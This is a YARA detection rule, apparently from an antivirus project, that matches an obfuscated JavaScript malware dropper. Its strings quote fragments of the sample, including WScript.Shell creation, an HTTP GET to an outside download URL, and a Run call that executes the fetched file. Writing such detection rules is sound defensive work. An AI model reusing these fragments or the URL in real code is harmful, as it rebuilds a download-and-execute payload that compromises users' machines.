rule sig_20160427_459f21a3ca5a1bc24a0152600e731cfa {
  meta:
    description = "datamaliciousorder - file 20160427_459f21a3ca5a1bc24a0152600e731cfa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "950b2a292b4c82680f581bbdc541ad3d829e859d11e4dd33990a139f9a0e5eb1"

  strings:
    $s1  = "function QzjbjOygud() {return TqcfvCmxab[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"SNPRsFY" ascii
    $s2  = "function QzjbjOygud() {return TqcfvCmxab[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"SNPRsFY" ascii
    $s3  = "function CihymRkyio(UnvaaKavwb, RvvmyBoglu){BnhkvAjwnm = BnhkvAjwnm * 1; return UnvaaKavwb - RvvmyBoglu;};" fullword ascii
    $s4  = "var TqcfvCmxab = function JkhoxRdmbg() {return HqybkVuzab[DgapoLxlkr](\"WScript\"+\".Shell\");}(), IfmsoLwsmv = 11;" fullword ascii
    $s5  = "FdenzTvfeg[YszblOcbtu](\"G\" + \"ET\", \"http://directenergy.tv/l2isd\", false);" fullword ascii
    $s6  = "var HqybkVuzab = this[\"WScript\"];" fullword ascii
    $s7  = "function DkdovZzciy(){return LarnuWptba + \"\";};" fullword ascii
    $s8  = "if (FdenzTvfeg[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "var LalnaKqmom = new this[\"D\"+\"ate\"]();" fullword ascii
    $s10 = "VuvvjOgivg = true; " fullword ascii
    $s11 = "var VuvvjOgivg = false;" fullword ascii
    $s12 = "function KgtasMprwz(AdvyhAintw){TqcfvCmxab[\"R\"+\"un\"](AdvyhAintw, BnhkvAjwnm, BnhkvAjwnm);};" fullword ascii
    $s13 = "var MdjsyGiuhd = false;" fullword ascii
    $s14 = "function OqblnUbgbm(){return 23;};" fullword ascii
    $s15 = "var PfcbqCqgiu = false;" fullword ascii
    $s16 = "return CihymRkyio(ZlajwAstre, YjazdIxbxx);" fullword ascii
    $s17 = "function YdnvoRxzji(CyixdRirxv) {var SdbnuBqoqv = (1, 2, 3, 4, 5, CyixdRirxv); return SdbnuBqoqv;};" fullword ascii
    $s18 = "function LrhweSdwma()" fullword ascii
    $s19 = "PfcbqCqgiu = true;" fullword ascii
    $s20 = "MdjsyGiuhd = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}